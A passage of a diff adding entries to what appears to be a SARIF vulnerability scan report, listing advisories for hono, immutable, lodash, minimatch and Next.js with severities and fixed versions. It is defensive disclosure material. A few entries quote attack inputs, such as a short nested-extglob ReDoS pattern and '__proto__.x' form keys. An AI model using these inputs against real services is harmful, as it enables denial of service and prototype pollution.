+                "text": "Vulnerability CVE-2026-29085\nSeverity: MEDIUM\nPackage: hono\nFixed Version: 4.12.4\nLink: [CVE-2026-29085](https://avd.aquasec.com/nvd/cve-2026-29085)\nHono is a Web application framework that provides support for any JavaScript runtime. Prior to version 4.12.4, when using streamSSE() in Streaming Helper, the event, id, and retry fields were not validated for carriage return (\\r) or newline (\\n) characters. Because the SSE protocol uses line breaks as field delimiters, this could allow injection of additional SSE fields within the same event frame if untrusted input was passed into these fields. This issue has been patched in version 4.12.4.",
+                "markdown": "**Vulnerability CVE-2026-29085**\n| Severity | Package | Fixed Version | Link |\n| --- | --- | --- | --- |\n|MEDIUM|hono|4.12.4|[CVE-2026-29085](https://avd.aquasec.com/nvd/cve-2026-29085)|\n\nHono is a Web application framework that provides support for any JavaScript runtime. Prior to version 4.12.4, when using streamSSE() in Streaming Helper, the event, id, and retry fields were not validated for carriage return (\\r) or newline (\\n) characters. Because the SSE protocol uses line breaks as field delimiters, this could allow injection of additional SSE fields within the same event frame if untrusted input was passed into these fields. This issue has been patched in version 4.12.4."
+              },
+              "properties": {
+                "precision": "very-high",
+                "security-severity": "6.5",
+                "tags": [
+                  "vulnerability",
+                  "security",
+                  "MEDIUM"
+                ]
+              }
+            },
+            {
+              "id": "CVE-2026-29086",
+              "name": "LanguageSpecificPackageVulnerability",
+              "shortDescription": {
+                "text": "Hono Vulnerable to Cookie Attribute Injection via Unsanitized domain and path in setCookie()"
+              },
+              "fullDescription": {
+                "text": "Hono is a Web application framework that provides support for any JavaScript runtime. Prior to version 4.12.4, the setCookie() utility did not validate semicolons (;), carriage returns (\\r), or newline characters (\\n) in the domain and path options when constructing the Set-Cookie header. Because cookie attributes are delimited by semicolons, this could allow injection of additional cookie attributes if untrusted input was passed into these fields. This issue has been patched in version 4.12.4."
+              },
+              "defaultConfiguration": {
+                "level": "warning"
+              },
+              "helpUri": "https://avd.aquasec.com/nvd/cve-2026-29086",
+              "help": {
+                "text": "Vulnerability CVE-2026-29086\nSeverity: MEDIUM\nPackage: hono\nFixed Version: 4.12.4\nLink: [CVE-2026-29086](https://avd.aquasec.com/nvd/cve-2026-29086)\nHono is a Web application framework that provides support for any JavaScript runtime. Prior to version 4.12.4, the setCookie() utility did not validate semicolons (;), carriage returns (\\r), or newline characters (\\n) in the domain and path options when constructing the Set-Cookie header. Because cookie attributes are delimited by semicolons, this could allow injection of additional cookie attributes if untrusted input was passed into these fields. This issue has been patched in version 4.12.4.",
+                "markdown": "**Vulnerability CVE-2026-29086**\n| Severity | Package | Fixed Version | Link |\n| --- | --- | --- | --- |\n|MEDIUM|hono|4.12.4|[CVE-2026-29086](https://avd.aquasec.com/nvd/cve-2026-29086)|\n\nHono is a Web application framework that provides support for any JavaScript runtime. Prior to version 4.12.4, the setCookie() utility did not validate semicolons (;), carriage returns (\\r), or newline characters (\\n) in the domain and path options when constructing the Set-Cookie header. Because cookie attributes are delimited by semicolons, this could allow injection of additional cookie attributes if untrusted input was passed into these fields. This issue has been patched in version 4.12.4."
+              },
+              "properties": {
+                "precision": "very-high",
+                "security-severity": "5.4",
+                "tags": [
+                  "vulnerability",
+                  "security",
+                  "MEDIUM"
+                ]
+              }
+            },
+            {
+              "id": "GHSA-v8w9-8mx6-g223",
+              "name": "LanguageSpecificPackageVulnerability",
+              "shortDescription": {
+                "text": "Hono vulnerable to Prototype Pollution possible through __proto__ key allowed in parseBody({ dot: true })"
+              },
+              "fullDescription": {
+                "text": "## Summary\n\nWhen using `parseBody({ dot: true })` in HonoRequest, specially crafted form field names such as `__proto__.x` could create objects containing a `__proto__` property.\n\nIf the parsed result is later merged into regular JavaScript objects using unsafe merge patterns, this may lead to prototype pollution in the target object.\n\n## Details\n\nThe `parseBody({ dot: true })` feature supports dot notation to construct nested objects from form field names.\n\nIn previous versions, the `__proto__` path segment was not filtered. As a result, specially crafted keys such as `__proto__.x` could produce objects containing `__proto__` properties.\n\nWhile this behavior does not directly modify `Object.prototype` within Hono itself, it may become exploitable if the parsed result is later merged into regular JavaScript objects using unsafe merge patterns.\n\n## Impact\n\nApplications that merge parsed form data into regular objects using unsafe patterns (for example recursive deep merge utilities) may become vulnerable to prototype pollution."
+              },
+              "defaultConfiguration": {
+                "level": "warning"
+              },
+              "helpUri": "https://github.com/advisories/GHSA-v8w9-8mx6-g223",
+              "help": {
+                "text": "Vulnerability GHSA-v8w9-8mx6-g223\nSeverity: MEDIUM\nPackage: hono\nFixed Version: 4.12.7\nLink: [GHSA-v8w9-8mx6-g223](https://github.com/advisories/GHSA-v8w9-8mx6-g223)\n## Summary\n\nWhen using `parseBody({ dot: true })` in HonoRequest, specially crafted form field names such as `__proto__.x` could create objects containing a `__proto__` property.\n\nIf the parsed result is later merged into regular JavaScript objects using unsafe merge patterns, this may lead to prototype pollution in the target object.\n\n## Details\n\nThe `parseBody({ dot: true })` feature supports dot notation to construct nested objects from form field names.\n\nIn previous versions, the `__proto__` path segment was not filtered. As a result, specially crafted keys such as `__proto__.x` could produce objects containing `__proto__` properties.\n\nWhile this behavior does not directly modify `Object.prototype` within Hono itself, it may become exploitable if the parsed result is later merged into regular JavaScript objects using unsafe merge patterns.\n\n## Impact\n\nApplications that merge parsed form data into regular objects using unsafe patterns (for example recursive deep merge utilities) may become vulnerable to prototype pollution.",
+                "markdown": "**Vulnerability GHSA-v8w9-8mx6-g223**\n| Severity | Package | Fixed Version | Link |\n| --- | --- | --- | --- |\n|MEDIUM|hono|4.12.7|[GHSA-v8w9-8mx6-g223](https://github.com/advisories/GHSA-v8w9-8mx6-g223)|\n\n## Summary\n\nWhen using `parseBody({ dot: true })` in HonoRequest, specially crafted form field names such as `__proto__.x` could create objects containing a `__proto__` property.\n\nIf the parsed result is later merged into regular JavaScript objects using unsafe merge patterns, this may lead to prototype pollution in the target object.\n\n## Details\n\nThe `parseBody({ dot: true })` feature supports dot notation to construct nested objects from form field names.\n\nIn previous versions, the `__proto__` path segment was not filtered. As a result, specially crafted keys such as `__proto__.x` could produce objects containing `__proto__` properties.\n\nWhile this behavior does not directly modify `Object.prototype` within Hono itself, it may become exploitable if the parsed result is later merged into regular JavaScript objects using unsafe merge patterns.\n\n## Impact\n\nApplications that merge parsed form data into regular objects using unsafe patterns (for example recursive deep merge utilities) may become vulnerable to prototype pollution."
+              },
+              "properties": {
+                "precision": "very-high",
+                "security-severity": "4.8",
+                "tags": [
+                  "vulnerability",
+                  "security",
+                  "MEDIUM"
+                ]
+              }
+            },
+            {
+              "id": "GHSA-gq3j-xvxp-8hrf",
+              "name": "LanguageSpecificPackageVulnerability",
+              "shortDescription": {
+                "text": "Hono added timing comparison hardening in basicAuth and bearerAuth"
+              },
+              "fullDescription": {
+                "text": "## Summary\n\nThe `basicAuth` and `bearerAuth` middlewares previously used a comparison that was not fully timing-safe.\n\nThe `timingSafeEqual` function used normal string equality (`===`) when comparing hash values. This comparison may stop early if values differ, which can theoretically cause small timing differences.\n\nThe implementation has been updated to use a safer comparison method.\n\n\n## Details\n\nThe issue was caused by the use of normal string equality (`===`) when comparing hash values inside the `timingSafeEqual` function.\n\nIn JavaScript, string comparison may stop as soon as a difference is found. This means the comparison time can slightly vary depending on how many characters match.\n\nUnder very specific and controlled conditions, this behavior could theoretically allow timing-based analysis.\n\nThe implementation has been updated to:\n\n- Avoid early termination during comparison\n- Use a constant-time-style comparison method\n\n## Impact\n\nThis issue is unlikely to be exploited in normal environments.\n\nIt may only be relevant in highly controlled situations where precise timing measurements are possible.\n\nThis change is considered a security hardening improvement. Users are encouraged to upgrade to the latest version."
+              },
+              "defaultConfiguration": {
+                "level": "note"
+              },
+              "helpUri": "https://github.com/advisories/GHSA-gq3j-xvxp-8hrf",
+              "help": {
+                "text": "Vulnerability GHSA-gq3j-xvxp-8hrf\nSeverity: LOW\nPackage: hono\nFixed Version: 4.11.10\nLink: [GHSA-gq3j-xvxp-8hrf](https://github.com/advisories/GHSA-gq3j-xvxp-8hrf)\n## Summary\n\nThe `basicAuth` and `bearerAuth` middlewares previously used a comparison that was not fully timing-safe.\n\nThe `timingSafeEqual` function used normal string equality (`===`) when comparing hash values. This comparison may stop early if values differ, which can theoretically cause small timing differences.\n\nThe implementation has been updated to use a safer comparison method.\n\n\n## Details\n\nThe issue was caused by the use of normal string equality (`===`) when comparing hash values inside the `timingSafeEqual` function.\n\nIn JavaScript, string comparison may stop as soon as a difference is found. This means the comparison time can slightly vary depending on how many characters match.\n\nUnder very specific and controlled conditions, this behavior could theoretically allow timing-based analysis.\n\nThe implementation has been updated to:\n\n- Avoid early termination during comparison\n- Use a constant-time-style comparison method\n\n## Impact\n\nThis issue is unlikely to be exploited in normal environments.\n\nIt may only be relevant in highly controlled situations where precise timing measurements are possible.\n\nThis change is considered a security hardening improvement. Users are encouraged to upgrade to the latest version.",
+                "markdown": "**Vulnerability GHSA-gq3j-xvxp-8hrf**\n| Severity | Package | Fixed Version | Link |\n| --- | --- | --- | --- |\n|LOW|hono|4.11.10|[GHSA-gq3j-xvxp-8hrf](https://github.com/advisories/GHSA-gq3j-xvxp-8hrf)|\n\n## Summary\n\nThe `basicAuth` and `bearerAuth` middlewares previously used a comparison that was not fully timing-safe.\n\nThe `timingSafeEqual` function used normal string equality (`===`) when comparing hash values. This comparison may stop early if values differ, which can theoretically cause small timing differences.\n\nThe implementation has been updated to use a safer comparison method.\n\n\n## Details\n\nThe issue was caused by the use of normal string equality (`===`) when comparing hash values inside the `timingSafeEqual` function.\n\nIn JavaScript, string comparison may stop as soon as a difference is found. This means the comparison time can slightly vary depending on how many characters match.\n\nUnder very specific and controlled conditions, this behavior could theoretically allow timing-based analysis.\n\nThe implementation has been updated to:\n\n- Avoid early termination during comparison\n- Use a constant-time-style comparison method\n\n## Impact\n\nThis issue is unlikely to be exploited in normal environments.\n\nIt may only be relevant in highly controlled situations where precise timing measurements are possible.\n\nThis change is considered a security hardening improvement. Users are encouraged to upgrade to the latest version."
+              },
+              "properties": {
+                "precision": "very-high",
+                "security-severity": "3.7",
+                "tags": [
+                  "vulnerability",
+                  "security",
+                  "LOW"
+                ]
+              }
+            },
+            {
+              "id": "CVE-2026-29063",
+              "name": "LanguageSpecificPackageVulnerability",
+              "shortDescription": {
+                "text": "Immutable.js provides many Persistent Immutable data structures. Prior ..."
+              },
+              "fullDescription": {
+                "text": "Immutable.js provides many Persistent Immutable data structures. Prior to versions 3.8.3, 4.3.7, and 5.1.5, Prototype Pollution is possible in immutable via the mergeDeep(), mergeDeepWith(), merge(), Map.toJS(), and Map.toObject() APIs. This issue has been patched in versions 3.8.3, 4.3.7, and 5.1.5."
+              },
+              "defaultConfiguration": {
+                "level": "error"
+              },
+              "helpUri": "https://avd.aquasec.com/nvd/cve-2026-29063",
+              "help": {
+                "text": "Vulnerability CVE-2026-29063\nSeverity: HIGH\nPackage: immutable\nFixed Version: 4.3.8, 5.1.5, 3.8.3\nLink: [CVE-2026-29063](https://avd.aquasec.com/nvd/cve-2026-29063)\nImmutable.js provides many Persistent Immutable data structures. Prior to versions 3.8.3, 4.3.7, and 5.1.5, Prototype Pollution is possible in immutable via the mergeDeep(), mergeDeepWith(), merge(), Map.toJS(), and Map.toObject() APIs. This issue has been patched in versions 3.8.3, 4.3.7, and 5.1.5.",
+                "markdown": "**Vulnerability CVE-2026-29063**\n| Severity | Package | Fixed Version | Link |\n| --- | --- | --- | --- |\n|HIGH|immutable|4.3.8, 5.1.5, 3.8.3|[CVE-2026-29063](https://avd.aquasec.com/nvd/cve-2026-29063)|\n\nImmutable.js provides many Persistent Immutable data structures. Prior to versions 3.8.3, 4.3.7, and 5.1.5, Prototype Pollution is possible in immutable via the mergeDeep(), mergeDeepWith(), merge(), Map.toJS(), and Map.toObject() APIs. This issue has been patched in versions 3.8.3, 4.3.7, and 5.1.5."
+              },
+              "properties": {
+                "precision": "very-high",
+                "security-severity": "0.0",
+                "tags": [
+                  "vulnerability",
+                  "security",
+                  "HIGH"
+                ]
+              }
+            },
+            {
+              "id": "CVE-2025-13465",
+              "name": "LanguageSpecificPackageVulnerability",
+              "shortDescription": {
+                "text": "lodash: prototype pollution in _.unset and _.omit functions"
+              },
+              "fullDescription": {
+                "text": "Lodash versions 4.0.0 through 4.17.22 are vulnerable to prototype pollution in the _.unset and _.omit functions. An attacker can pass crafted paths which cause Lodash to delete methods from global prototypes.\n\nThe issue permits deletion of properties but does not allow overwriting their original behavior.\n\nThis issue is patched on 4.17.23"
+              },
+              "defaultConfiguration": {
+                "level": "warning"
+              },
+              "helpUri": "https://avd.aquasec.com/nvd/cve-2025-13465",
+              "help": {
+                "text": "Vulnerability CVE-2025-13465\nSeverity: MEDIUM\nPackage: lodash\nFixed Version: 4.17.23\nLink: [CVE-2025-13465](https://avd.aquasec.com/nvd/cve-2025-13465)\nLodash versions 4.0.0 through 4.17.22 are vulnerable to prototype pollution in the _.unset and _.omit functions. An attacker can pass crafted paths which cause Lodash to delete methods from global prototypes.\n\nThe issue permits deletion of properties but does not allow overwriting their original behavior.\n\nThis issue is patched on 4.17.23",
+                "markdown": "**Vulnerability CVE-2025-13465**\n| Severity | Package | Fixed Version | Link |\n| --- | --- | --- | --- |\n|MEDIUM|lodash|4.17.23|[CVE-2025-13465](https://avd.aquasec.com/nvd/cve-2025-13465)|\n\nLodash versions 4.0.0 through 4.17.22 are vulnerable to prototype pollution in the _.unset and _.omit functions. An attacker can pass crafted paths which cause Lodash to delete methods from global prototypes.\n\nThe issue permits deletion of properties but does not allow overwriting their original behavior.\n\nThis issue is patched on 4.17.23"
+              },
+              "properties": {
+                "precision": "very-high",
+                "security-severity": "6.5",
+                "tags": [
+                  "vulnerability",
+                  "security",
+                  "MEDIUM"
+                ]
+              }
+            },
+            {
+              "id": "CVE-2026-26996",
+              "name": "LanguageSpecificPackageVulnerability",
+              "shortDescription": {
+                "text": "minimatch: minimatch: Denial of Service via specially crafted glob patterns"
+              },
+              "fullDescription": {
+                "text": "minimatch is a minimal matching utility for converting glob expressions into JavaScript RegExp objects. Versions 10.2.0 and below are vulnerable to Regular Expression Denial of Service (ReDoS) when a glob pattern contains many consecutive * wildcards followed by a literal character that doesn\u0026#39;t appear in the test string. Each * compiles to a separate [^/]*? regex group, and when the match fails, V8\u0026#39;s regex engine backtracks exponentially across all possible splits. The time complexity is O(4^N) where N is the number of * characters. With N=15, a single minimatch() call takes ~2 seconds. With N=34, it hangs effectively forever. Any application that passes user-controlled strings to minimatch() as the pattern argument is vulnerable to DoS. This issue has been fixed in version 10.2.1."
+              },
+              "defaultConfiguration": {
+                "level": "error"
+              },
+              "helpUri": "https://avd.aquasec.com/nvd/cve-2026-26996",
+              "help": {
+                "text": "Vulnerability CVE-2026-26996\nSeverity: HIGH\nPackage: minimatch\nFixed Version: 10.2.1, 9.0.6, 8.0.5, 7.4.7, 6.2.1, 5.1.7, 4.2.4, 3.1.3\nLink: [CVE-2026-26996](https://avd.aquasec.com/nvd/cve-2026-26996)\nminimatch is a minimal matching utility for converting glob expressions into JavaScript RegExp objects. Versions 10.2.0 and below are vulnerable to Regular Expression Denial of Service (ReDoS) when a glob pattern contains many consecutive * wildcards followed by a literal character that doesn't appear in the test string. Each * compiles to a separate [^/]*? regex group, and when the match fails, V8's regex engine backtracks exponentially across all possible splits. The time complexity is O(4^N) where N is the number of * characters. With N=15, a single minimatch() call takes ~2 seconds. With N=34, it hangs effectively forever. Any application that passes user-controlled strings to minimatch() as the pattern argument is vulnerable to DoS. This issue has been fixed in version 10.2.1.",
+                "markdown": "**Vulnerability CVE-2026-26996**\n| Severity | Package | Fixed Version | Link |\n| --- | --- | --- | --- |\n|HIGH|minimatch|10.2.1, 9.0.6, 8.0.5, 7.4.7, 6.2.1, 5.1.7, 4.2.4, 3.1.3|[CVE-2026-26996](https://avd.aquasec.com/nvd/cve-2026-26996)|\n\nminimatch is a minimal matching utility for converting glob expressions into JavaScript RegExp objects. Versions 10.2.0 and below are vulnerable to Regular Expression Denial of Service (ReDoS) when a glob pattern contains many consecutive * wildcards followed by a literal character that doesn't appear in the test string. Each * compiles to a separate [^/]*? regex group, and when the match fails, V8's regex engine backtracks exponentially across all possible splits. The time complexity is O(4^N) where N is the number of * characters. With N=15, a single minimatch() call takes ~2 seconds. With N=34, it hangs effectively forever. Any application that passes user-controlled strings to minimatch() as the pattern argument is vulnerable to DoS. This issue has been fixed in version 10.2.1."
+              },
+              "properties": {
+                "precision": "very-high",
+                "security-severity": "0.0",
+                "tags": [
+                  "vulnerability",
+                  "security",
+                  "HIGH"
+                ]
+              }
+            },
+            {
+              "id": "CVE-2026-27903",
+              "name": "LanguageSpecificPackageVulnerability",
+              "shortDescription": {
+                "text": "minimatch: minimatch: Denial of Service due to unbounded recursive backtracking via crafted glob patterns"
+              },
+              "fullDescription": {
+                "text": "minimatch is a minimal matching utility for converting glob expressions into JavaScript RegExp objects. Prior to version 10.2.3, 9.0.7, 8.0.6, 7.4.8, 6.2.2, 5.1.8, 4.2.5, and 3.1.3, `matchOne()` performs unbounded recursive backtracking when a glob pattern contains multiple non-adjacent `**` (GLOBSTAR) segments and the input path does not match. The time complexity is O(C(n, k)) -- binomial -- where `n` is the number of path segments and `k` is the number of globstars. With k=11 and n=30, a call to the default `minimatch()` API stalls for roughly 5 seconds. With k=13, it exceeds 15 seconds. No memoization or call budget exists to bound this behavior. Any application where an attacker can influence the glob pattern passed to `minimatch()` is vulnerable. The realistic attack surface includes build tools and task runners that accept user-supplied glob arguments (ESLint, Webpack, Rollup config), multi-tenant systems where one tenant configures glob-based rules that run in a shared process, admin or developer interfaces that accept ignore-rule or filter configuration as globs, and CI/CD pipelines that evaluate user-submitted config files containing glob patterns. An attacker who can place a crafted pattern into any of these paths can stall the Node.js event loop for tens of seconds per invocation. The pattern is 56 bytes for a 5-second stall and does not require authentication in contexts where pattern input is part of the feature. Versions 10.2.3, 9.0.7, 8.0.6, 7.4.8, 6.2.2, 5.1.8, 4.2.5, and 3.1.3 fix the issue."
+              },
+              "defaultConfiguration": {
+                "level": "error"
+              },
+              "helpUri": "https://avd.aquasec.com/nvd/cve-2026-27903",
+              "help": {
+                "text": "Vulnerability CVE-2026-27903\nSeverity: HIGH\nPackage: minimatch\nFixed Version: 10.2.3, 9.0.7, 8.0.6, 7.4.8, 6.2.2, 5.1.8, 4.2.5, 3.1.3\nLink: [CVE-2026-27903](https://avd.aquasec.com/nvd/cve-2026-27903)\nminimatch is a minimal matching utility for converting glob expressions into JavaScript RegExp objects. Prior to version 10.2.3, 9.0.7, 8.0.6, 7.4.8, 6.2.2, 5.1.8, 4.2.5, and 3.1.3, `matchOne()` performs unbounded recursive backtracking when a glob pattern contains multiple non-adjacent `**` (GLOBSTAR) segments and the input path does not match. The time complexity is O(C(n, k)) -- binomial -- where `n` is the number of path segments and `k` is the number of globstars. With k=11 and n=30, a call to the default `minimatch()` API stalls for roughly 5 seconds. With k=13, it exceeds 15 seconds. No memoization or call budget exists to bound this behavior. Any application where an attacker can influence the glob pattern passed to `minimatch()` is vulnerable. The realistic attack surface includes build tools and task runners that accept user-supplied glob arguments (ESLint, Webpack, Rollup config), multi-tenant systems where one tenant configures glob-based rules that run in a shared process, admin or developer interfaces that accept ignore-rule or filter configuration as globs, and CI/CD pipelines that evaluate user-submitted config files containing glob patterns. An attacker who can place a crafted pattern into any of these paths can stall the Node.js event loop for tens of seconds per invocation. The pattern is 56 bytes for a 5-second stall and does not require authentication in contexts where pattern input is part of the feature. Versions 10.2.3, 9.0.7, 8.0.6, 7.4.8, 6.2.2, 5.1.8, 4.2.5, and 3.1.3 fix the issue.",
+                "markdown": "**Vulnerability CVE-2026-27903**\n| Severity | Package | Fixed Version | Link |\n| --- | --- | --- | --- |\n|HIGH|minimatch|10.2.3, 9.0.7, 8.0.6, 7.4.8, 6.2.2, 5.1.8, 4.2.5, 3.1.3|[CVE-2026-27903](https://avd.aquasec.com/nvd/cve-2026-27903)|\n\nminimatch is a minimal matching utility for converting glob expressions into JavaScript RegExp objects. Prior to version 10.2.3, 9.0.7, 8.0.6, 7.4.8, 6.2.2, 5.1.8, 4.2.5, and 3.1.3, `matchOne()` performs unbounded recursive backtracking when a glob pattern contains multiple non-adjacent `**` (GLOBSTAR) segments and the input path does not match. The time complexity is O(C(n, k)) -- binomial -- where `n` is the number of path segments and `k` is the number of globstars. With k=11 and n=30, a call to the default `minimatch()` API stalls for roughly 5 seconds. With k=13, it exceeds 15 seconds. No memoization or call budget exists to bound this behavior. Any application where an attacker can influence the glob pattern passed to `minimatch()` is vulnerable. The realistic attack surface includes build tools and task runners that accept user-supplied glob arguments (ESLint, Webpack, Rollup config), multi-tenant systems where one tenant configures glob-based rules that run in a shared process, admin or developer interfaces that accept ignore-rule or filter configuration as globs, and CI/CD pipelines that evaluate user-submitted config files containing glob patterns. An attacker who can place a crafted pattern into any of these paths can stall the Node.js event loop for tens of seconds per invocation. The pattern is 56 bytes for a 5-second stall and does not require authentication in contexts where pattern input is part of the feature. Versions 10.2.3, 9.0.7, 8.0.6, 7.4.8, 6.2.2, 5.1.8, 4.2.5, and 3.1.3 fix the issue."
+              },
+              "properties": {
+                "precision": "very-high",
+                "security-severity": "7.5",
+                "tags": [
+                  "vulnerability",
+                  "security",
+                  "HIGH"
+                ]
+              }
+            },
+            {
+              "id": "CVE-2026-27904",
+              "name": "LanguageSpecificPackageVulnerability",
+              "shortDescription": {
+                "text": "minimatch: Minimatch: Denial of Service via catastrophic backtracking in glob expressions"
+              },
+              "fullDescription": {
+                "text": "minimatch is a minimal matching utility for converting glob expressions into JavaScript RegExp objects. Prior to version 10.2.3, 9.0.7, 8.0.6, 7.4.8, 6.2.2, 5.1.8, 4.2.5, and 3.1.4, nested `*()` extglobs produce regexps with nested unbounded quantifiers (e.g. `(?:(?:a|b)*)*`), which exhibit catastrophic backtracking in V8. With a 12-byte pattern `*(*(*(a|b)))` and an 18-byte non-matching input, `minimatch()` stalls for over 7 seconds. Adding a single nesting level or a few input characters pushes this to minutes. This is the most severe finding: it is triggered by the default `minimatch()` API with no special options, and the minimum viable pattern is only 12 bytes. The same issue affects `+()` extglobs equally. Versions 10.2.3, 9.0.7, 8.0.6, 7.4.8, 6.2.2, 5.1.8, 4.2.5, and 3.1.4 fix the issue."
+              },
+              "defaultConfiguration": {
+                "level": "error"
+              },
+              "helpUri": "https://avd.aquasec.com/nvd/cve-2026-27904",
+              "help": {
+                "text": "Vulnerability CVE-2026-27904\nSeverity: HIGH\nPackage: minimatch\nFixed Version: 10.2.3, 9.0.7, 8.0.6, 7.4.8, 6.2.2, 5.1.8, 4.2.5, 3.1.4\nLink: [CVE-2026-27904](https://avd.aquasec.com/nvd/cve-2026-27904)\nminimatch is a minimal matching utility for converting glob expressions into JavaScript RegExp objects. Prior to version 10.2.3, 9.0.7, 8.0.6, 7.4.8, 6.2.2, 5.1.8, 4.2.5, and 3.1.4, nested `*()` extglobs produce regexps with nested unbounded quantifiers (e.g. `(?:(?:a|b)*)*`), which exhibit catastrophic backtracking in V8. With a 12-byte pattern `*(*(*(a|b)))` and an 18-byte non-matching input, `minimatch()` stalls for over 7 seconds. Adding a single nesting level or a few input characters pushes this to minutes. This is the most severe finding: it is triggered by the default `minimatch()` API with no special options, and the minimum viable pattern is only 12 bytes. The same issue affects `+()` extglobs equally. Versions 10.2.3, 9.0.7, 8.0.6, 7.4.8, 6.2.2, 5.1.8, 4.2.5, and 3.1.4 fix the issue.",
+                "markdown": "**Vulnerability CVE-2026-27904**\n| Severity | Package | Fixed Version | Link |\n| --- | --- | --- | --- |\n|HIGH|minimatch|10.2.3, 9.0.7, 8.0.6, 7.4.8, 6.2.2, 5.1.8, 4.2.5, 3.1.4|[CVE-2026-27904](https://avd.aquasec.com/nvd/cve-2026-27904)|\n\nminimatch is a minimal matching utility for converting glob expressions into JavaScript RegExp objects. Prior to version 10.2.3, 9.0.7, 8.0.6, 7.4.8, 6.2.2, 5.1.8, 4.2.5, and 3.1.4, nested `*()` extglobs produce regexps with nested unbounded quantifiers (e.g. `(?:(?:a|b)*)*`), which exhibit catastrophic backtracking in V8. With a 12-byte pattern `*(*(*(a|b)))` and an 18-byte non-matching input, `minimatch()` stalls for over 7 seconds. Adding a single nesting level or a few input characters pushes this to minutes. This is the most severe finding: it is triggered by the default `minimatch()` API with no special options, and the minimum viable pattern is only 12 bytes. The same issue affects `+()` extglobs equally. Versions 10.2.3, 9.0.7, 8.0.6, 7.4.8, 6.2.2, 5.1.8, 4.2.5, and 3.1.4 fix the issue."
+              },
+              "properties": {
+                "precision": "very-high",
+                "security-severity": "7.5",
+                "tags": [
+                  "vulnerability",
+                  "security",
+                  "HIGH"
+                ]
+              }
+            },
+            {
+              "id": "GHSA-h25m-26qc-wcjf",
+              "name": "LanguageSpecificPackageVulnerability",
+              "shortDescription": {
+                "text": "Next.js HTTP request deserialization can lead to DoS when using insecure React Server Components"
+              },
+              "fullDescription": {
+                "text": "A vulnerability affects certain React Server Components packages for versions 19.0.x, 19.1.x, and 19.2.x and frameworks that use the affected packages, including Next.js 13.x, 14.x, 15.x, and 16.x using the App Router. The issue is tracked upstream as [CVE-2026-23864](https://github.com/facebook/react/security/advisories/GHSA-83fc-fqcc-2hmg).\n\nA specially crafted HTTP request can be sent to any App Router Server Function endpoint that, when deserialized, may trigger excessive CPU usage, out-of-memory exceptions, or server crashes. This can result in denial of service in unpatched environments."
+              },
+              "defaultConfiguration": {
+                "level": "error"
+              },
+              "helpUri": "https://github.com/advisories/GHSA-h25m-26qc-wcjf",
+              "help": {
+                "text": "Vulnerability GHSA-h25m-26qc-wcjf\nSeverity: HIGH\nPackage: next\nFixed Version: 15.0.8, 15.1.12, 15.2.9, 15.3.9, 15.4.11, 15.5.10, 15.6.0-canary.61, 16.0.11, 16.1.5\nLink: [GHSA-h25m-26qc-wcjf](https://github.com/advisories/GHSA-h25m-26qc-wcjf)\nA vulnerability affects certain React Server Components packages for versions 19.0.x, 19.1.x, and 19.2.x and frameworks that use the affected packages, including Next.js 13.x, 14.x, 15.x, and 16.x using the App Router. The issue is tracked upstream as [CVE-2026-23864](https://github.com/facebook/react/security/advisories/GHSA-83fc-fqcc-2hmg).\n\nA specially crafted HTTP request can be sent to any App Router Server Function endpoint that, when deserialized, may trigger excessive CPU usage, out-of-memory exceptions, or server crashes. This can result in denial of service in unpatched environments.",
+                "markdown": "**Vulnerability GHSA-h25m-26qc-wcjf**\n| Severity | Package | Fixed Version | Link |\n| --- | --- | --- | --- |\n|HIGH|next|15.0.8, 15.1.12, 15.2.9, 15.3.9, 15.4.11, 15.5.10, 15.6.0-canary.61, 16.0.11, 16.1.5|[GHSA-h25m-26qc-wcjf](https://github.com/advisories/GHSA-h25m-26qc-wcjf)|\n\nA vulnerability affects certain React Server Components packages for versions 19.0.x, 19.1.x, and 19.2.x and frameworks that use the affected packages, including Next.js 13.x, 14.x, 15.x, and 16.x using the App Router. The issue is tracked upstream as [CVE-2026-23864](https://github.com/facebook/react/security/advisories/GHSA-83fc-fqcc-2hmg).\n\nA specially crafted HTTP request can be sent to any App Router Server Function endpoint that, when deserialized, may trigger excessive CPU usage, out-of-memory exceptions, or server crashes. This can result in denial of service in unpatched environments."
+              },
+              "properties": {
+                "precision": "very-high",
+                "security-severity": "7.5",
+                "tags": [
+                  "vulnerability",
+                  "security",
+                  "HIGH"
+                ]
+              }
+            },
+            {
+              "id": "CVE-2025-59471",
+              "name": "LanguageSpecificPackageVulnerability",
+              "shortDescription": {
+                "text": "next: NextJS Denial of Service in Image Optimizer"
+              },
+              "fullDescription": {
+                "text": "A denial of service vulnerability exists in self-hosted Next.js applications that have `remotePatterns` configured for the Image Optimizer. The image optimization endpoint (`/_next/image`) loads external images entirely into memory without enforcing a maximum size limit, allowing an attacker to cause out-of-memory conditions by requesting optimization of arbitrarily large images. This vulnerability requires that `remotePatterns` is configured to allow image optimization from external domains and that the attacker can serve or control a large image on an allowed domain.\r\n\r\nStrongly consider upgrading to 15.5.10 or 16.1.5 to reduce risk and prevent availability issues in Next applications."
+              },
+              "defaultConfiguration": {
+                "level": "warning"
+              },
+              "helpUri": "https://avd.aquasec.com/nvd/cve-2025-59471",
+              "help": {
+                "text": "Vulnerability CVE-2025-59471\nSeverity: MEDIUM\nPackage: next\nFixed Version: 15.5.10, 16.1.5\nLink: [CVE-2025-59471](https://avd.aquasec.com/nvd/cve-2025-59471)\nA denial of service vulnerability exists in self-hosted Next.js applications that have `remotePatterns` configured for the Image Optimizer. The image optimization endpoint (`/_next/image`) loads external images entirely into memory without enforcing a maximum size limit, allowing an attacker to cause out-of-memory conditions by requesting optimization of arbitrarily large images. This vulnerability requires that `remotePatterns` is configured to allow image optimization from external domains and that the attacker can serve or control a large image on an allowed domain.\r\n\r\nStrongly consider upgrading to 15.5.10 or 16.1.5 to reduce risk and prevent availability issues in Next applications.",
+                "markdown": "**Vulnerability CVE-2025-59471**\n| Severity | Package | Fixed Version | Link |\n| --- | --- | --- | --- |\n|MEDIUM|next|15.5.10, 16.1.5|[CVE-2025-59471](https://avd.aquasec.com/nvd/cve-2025-59471)|\n\nA denial of service vulnerability exists in self-hosted Next.js applications that have `remotePatterns` configured for the Image Optimizer. The image optimization endpoint (`/_next/image`) loads external images entirely into memory without enforcing a maximum size limit, allowing an attacker to cause out-of-memory conditions by requesting optimization of arbitrarily large images. This vulnerability requires that `remotePatterns` is configured to allow image optimization from external domains and that the attacker can serve or control a large image on an allowed domain.\r\n\r\nStrongly consider upgrading to 15.5.10 or 16.1.5 to reduce risk and prevent availability issues in Next applications."
+              },
+              "properties": {
+                "precision": "very-high",
+                "security-severity": "5.9",
+                "tags": [
+                  "vulnerability",
+                  "security",
+                  "MEDIUM"
+                ]
+              }
+            },
+            {
